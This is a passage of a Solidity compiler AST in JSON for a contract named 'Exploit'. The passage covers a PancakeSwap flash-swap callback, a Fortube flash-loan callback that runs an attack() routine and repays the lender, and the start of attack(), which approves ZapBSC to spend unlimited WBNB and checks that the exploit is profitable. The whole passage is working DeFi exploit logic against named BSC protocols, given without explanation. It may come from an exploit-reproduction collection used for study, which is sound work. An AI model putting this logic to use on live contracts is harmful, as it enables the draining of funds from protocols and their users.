                      "nodeType": "TupleExpression",
                      "src": "3786:34:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "id": 371,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "nodeType": "Conditional",
                    "src": "3736:84:0",
                    "trueExpression": {
                      "components": [
                        {
                          "commonType": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          "id": 360,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftExpression": {
                            "commonType": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            },
                            "id": 358,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "leftExpression": {
                              "components": [
                                {
                                  "commonType": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  },
                                  "id": 355,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "leftExpression": {
                                    "id": 353,
                                    "name": "_amount0Out",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": 235,
                                    "src": "3751:11:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  },
                                  "nodeType": "BinaryOperation",
                                  "operator": "*",
                                  "rightExpression": {
                                    "hexValue": "3130303030",
                                    "id": 354,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": true,
                                    "kind": "number",
                                    "lValueRequested": false,
                                    "nodeType": "Literal",
                                    "src": "3765:5:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_rational_10000_by_1",
                                      "typeString": "int_const 10000"
                                    },
                                    "value": "10000"
                                  },
                                  "src": "3751:19:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  }
                                }
                              ],
                              "id": 356,
                              "isConstant": false,
                              "isInlineArray": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "nodeType": "TupleExpression",
                              "src": "3750:21:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            },
                            "nodeType": "BinaryOperation",
                            "operator": "/",
                            "rightExpression": {
                              "hexValue": "39393735",
                              "id": 357,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "3774:4:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_9975_by_1",
                                "typeString": "int_const 9975"
                              },
                              "value": "9975"
                            },
                            "src": "3750:28:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "BinaryOperation",
                          "operator": "+",
                          "rightExpression": {
                            "hexValue": "31",
                            "id": 359,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "kind": "number",
                            "lValueRequested": false,
                            "nodeType": "Literal",
                            "src": "3781:1:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_rational_1_by_1",
                              "typeString": "int_const 1"
                            },
                            "value": "1"
                          },
                          "src": "3750:32:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        }
                      ],
                      "id": 361,
                      "isConstant": false,
                      "isInlineArray": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "nodeType": "TupleExpression",
                      "src": "3749:34:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "3716:104:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        "id": 382,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "arguments": [
                            {
                              "arguments": [
                                {
                                  "id": 378,
                                  "name": "this",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": -28,
                                  "src": "3861:4:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_contract$_Exploit_$587",
                                    "typeString": "contract Exploit"
                                  }
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_contract$_Exploit_$587",
                                    "typeString": "contract Exploit"
                                  }
                                ],
                                "id": 377,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "lValueRequested": false,
                                "nodeType": "ElementaryTypeNameExpression",
                                "src": "3853:7:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_type$_t_address_$",
                                  "typeString": "type(address)"
                                },
                                "typeName": {
                                  "id": 376,
                                  "name": "address",
                                  "nodeType": "ElementaryTypeName",
                                  "src": "3853:7:0",
                                  "typeDescriptions": {}
                                }
                              },
                              "id": 379,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "kind": "typeConversion",
                              "lValueRequested": false,
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "3853:13:0",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "expression": {
                              "id": 374,
                              "name": "WBNB",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 12,
                              "src": "3838:4:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_IERC20_$629",
                                "typeString": "contract IERC20"
                              }
                            },
                            "id": 375,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "balanceOf",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": 623,
                            "src": "3838:14:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_external_nonpayable$_t_address_$returns$_t_uint256_$",
                              "typeString": "function (address) external returns (uint256)"
                            }
                          },
                          "id": 380,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "3838:29:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": ">=",
                        "rightExpression": {
                          "id": 381,
                          "name": "retAmount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 349,
                          "src": "3871:9:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "src": "3838:42:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "6e6f74206d616b696e672070726f696674",
                        "id": 383,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "3882:19:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_ca77faa161e704db163ef5361c115e63f9b99b5cb8e71123810368bc625ba0db",
                          "typeString": "literal_string \"not making proift\""
                        },
                        "value": "not making proift"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_ca77faa161e704db163ef5361c115e63f9b99b5cb8e71123810368bc625ba0db",
                          "typeString": "literal_string \"not making proift\""
                        }
                      ],
                      "id": 373,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        -18,
                        -18
                      ],
                      "referencedDeclaration": -18,
                      "src": "3830:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 384,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "3830:72:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 385,
                  "nodeType": "ExpressionStatement",
                  "src": "3830:72:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "expression": {
                          "id": 389,
                          "name": "msg",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": -15,
                          "src": "3926:3:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_magic_message",
                            "typeString": "msg"
                          }
                        },
                        "id": 390,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "sender",
                        "nodeType": "MemberAccess",
                        "src": "3926:10:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 391,
                        "name": "retAmount",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 349,
                        "src": "3938:9:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 386,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 12,
                        "src": "3912:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$629",
                          "typeString": "contract IERC20"
                        }
                      },
                      "id": 388,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "transfer",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 598,
                      "src": "3912:13:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
                        "typeString": "function (address,uint256) external returns (bool)"
                      }
                    },
                    "id": 392,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "3912:36:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 393,
                  "nodeType": "ExpressionStatement",
                  "src": "3912:36:0"
                }
              ]
            },
            "functionSelector": "84800812",
            "id": 395,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "pancakeCall",
            "nameLocation": "2820:11:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 240,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 233,
                  "mutability": "mutable",
                  "name": "_sender",
                  "nameLocation": "2840:7:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 395,
                  "src": "2832:15:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 232,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "2832:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 235,
                  "mutability": "mutable",
                  "name": "_amount0Out",
                  "nameLocation": "2854:11:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 395,
                  "src": "2849:16:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 234,
                    "name": "uint",
                    "nodeType": "ElementaryTypeName",
                    "src": "2849:4:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 237,
                  "mutability": "mutable",
                  "name": "_amount1Out",
                  "nameLocation": "2872:11:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 395,
                  "src": "2867:16:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 236,
                    "name": "uint",
                    "nodeType": "ElementaryTypeName",
                    "src": "2867:4:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 239,
                  "mutability": "mutable",
                  "name": "_data",
                  "nameLocation": "2900:5:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 395,
                  "src": "2885:20:0",
                  "stateVariable": false,
                  "storageLocation": "calldata",
                  "typeDescriptions": {
                    "typeIdentifier": "t_bytes_calldata_ptr",
                    "typeString": "bytes"
                  },
                  "typeName": {
                    "id": 238,
                    "name": "bytes",
                    "nodeType": "ElementaryTypeName",
                    "src": "2885:5:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bytes_storage_ptr",
                      "typeString": "bytes"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "2831:75:0"
            },
            "returnParameters": {
              "id": 241,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "2916:0:0"
            },
            "scope": 587,
            "src": "2811:1144:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 420,
              "nodeType": "Block",
              "src": "4065:130:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "id": 406,
                      "name": "attack",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 586,
                      "src": "4075:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$__$returns$__$",
                        "typeString": "function ()"
                      }
                    },
                    "id": 407,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "4075:8:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 408,
                  "nodeType": "ExpressionStatement",
                  "src": "4075:8:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [],
                        "expression": {
                          "argumentTypes": [],
                          "expression": {
                            "id": 412,
                            "name": "FortubeBank",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 60,
                            "src": "4111:11:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IFortubeBank_$1379",
                              "typeString": "contract IFortubeBank"
                            }
                          },
                          "id": 413,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "controller",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 1378,
                          "src": "4111:22:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_nonpayable$__$returns$_t_address_$",
                            "typeString": "function () external returns (address)"
                          }
                        },
                        "id": 414,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "4111:24:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "commonType": {
                          "typeIdentifier": "t_rational_2964119851347815990462154_by_1",
                          "typeString": "int_const 2964119851347815990462154"
                        },
                        "id": 417,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "32393631373530343530393837303236333639333636363631",
                          "id": 415,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "4137:25:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_2961750450987026369366661_by_1",
                            "typeString": "int_const 2961750450987026369366661"
                          },
                          "value": "2961750450987026369366661"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "+",
                        "rightExpression": {
                          "hexValue": "32333639343030333630373839363231303935343933",
                          "id": 416,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "4165:22:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_2369400360789621095493_by_1",
                            "typeString": "int_const 2369400360789621095493"
                          },
                          "value": "2369400360789621095493"
                        },
                        "src": "4137:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_2964119851347815990462154_by_1",
                          "typeString": "int_const 2964119851347815990462154"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_2964119851347815990462154_by_1",
                          "typeString": "int_const 2964119851347815990462154"
                        }
                      ],
                      "expression": {
                        "id": 409,
                        "name": "BSC_USD",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 18,
                        "src": "4094:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$629",
                          "typeString": "contract IERC20"
                        }
                      },
                      "id": 411,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "transfer",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 598,
                      "src": "4094:16:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
                        "typeString": "function (address,uint256) external returns (bool)"
                      }
                    },
                    "id": 418,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "4094:94:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 419,
                  "nodeType": "ExpressionStatement",
                  "src": "4094:94:0"
                }
              ]
            },
            "functionSelector": "ee872558",
            "id": 421,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "executeOperation",
            "nameLocation": "3974:16:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 404,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 397,
                  "mutability": "mutable",
                  "name": "token",
                  "nameLocation": "3999:5:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 421,
                  "src": "3991:13:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 396,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "3991:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 399,
                  "mutability": "mutable",
                  "name": "amount",
                  "nameLocation": "4014:6:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 421,
                  "src": "4006:14:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 398,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "4006:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 401,
                  "mutability": "mutable",
                  "name": "fee",
                  "nameLocation": "4030:3:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 421,
                  "src": "4022:11:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 400,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "4022:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 403,
                  "mutability": "mutable",
                  "name": "params",
                  "nameLocation": "4050:6:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 421,
                  "src": "4035:21:0",
                  "stateVariable": false,
                  "storageLocation": "calldata",
                  "typeDescriptions": {
                    "typeIdentifier": "t_bytes_calldata_ptr",
                    "typeString": "bytes"
                  },
                  "typeName": {
                    "id": 402,
                    "name": "bytes",
                    "nodeType": "ElementaryTypeName",
                    "src": "4035:5:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bytes_storage_ptr",
                      "typeString": "bytes"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "3990:67:0"
            },
            "returnParameters": {
              "id": 405,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "4065:0:0"
            },
            "scope": 587,
            "src": "3965:230:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 585,
              "nodeType": "Block",
              "src": "4228:1194:0",
              "statements": [
                {
                  "assignments": [
                    425
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 425,
                      "mutability": "mutable",
                      "name": "WBNB_amount",
                      "nameLocation": "4243:11:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 585,
                      "src": "4238:16:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 424,
                        "name": "uint",
                        "nodeType": "ElementaryTypeName",
                        "src": "4238:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 435,
                  "initialValue": {
                    "commonType": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    },
                    "id": 434,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "arguments": [
                        {
                          "arguments": [
                            {
                              "id": 430,
                              "name": "this",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": -28,
                              "src": "4280:4:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_Exploit_$587",
                                "typeString": "contract Exploit"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_contract$_Exploit_$587",
                                "typeString": "contract Exploit"
                              }
                            ],
                            "id": 429,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "4272:7:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_address_$",
                              "typeString": "type(address)"
                            },
                            "typeName": {
                              "id": 428,
                              "name": "address",
                              "nodeType": "ElementaryTypeName",
                              "src": "4272:7:0",
                              "typeDescriptions": {}
                            }
                          },
                          "id": 431,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "4272:13:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "expression": {
                          "id": 426,
                          "name": "WBNB",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 12,
                          "src": "4257:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IERC20_$629",
                            "typeString": "contract IERC20"
                          }
                        },
                        "id": 427,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "balanceOf",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 623,
                        "src": "4257:14:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_nonpayable$_t_address_$returns$_t_uint256_$",
                          "typeString": "function (address) external returns (uint256)"
                        }
                      },
                      "id": 432,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "4257:29:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "-",
                    "rightExpression": {
                      "hexValue": "3135303030653138",
                      "id": 433,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "4289:8:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_15000000000000000000000_by_1",
                        "typeString": "int_const 15000000000000000000000"
                      },
                      "value": "15000e18"
                    },
                    "src": "4257:40:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "4238:59:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "id": 441,
                            "name": "ZapBSC",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 30,
                            "src": "4361:6:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IZap_$1313",
                              "typeString": "contract IZap"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_IZap_$1313",
                              "typeString": "contract IZap"
                            }
                          ],
                          "id": 440,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "4353:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 439,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "4353:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 442,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "4353:15:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "id": 445,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "4375:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_uint256_$",
                                "typeString": "type(uint256)"
                              },
                              "typeName": {
                                "id": 444,
                                "name": "uint256",
                                "nodeType": "ElementaryTypeName",
                                "src": "4375:7:0",
                                "typeDescriptions": {}
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_type$_t_uint256_$",
                                "typeString": "type(uint256)"
                              }
                            ],
                            "id": 443,
                            "name": "type",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -27,
                            "src": "4370:4:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_metatype_pure$__$returns$__$",
                              "typeString": "function () pure"
                            }
                          },
                          "id": 446,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "4370:13:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_magic_meta_type_t_uint256",
                            "typeString": "type(uint256)"
                          }
                        },
                        "id": 447,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "memberName": "max",
                        "nodeType": "MemberAccess",
                        "src": "4370:17:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 436,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 12,
                        "src": "4340:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$629",
                          "typeString": "contract IERC20"
                        }
                      },
                      "id": 438,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "approve",
                      "nodeType": "MemberAccess",
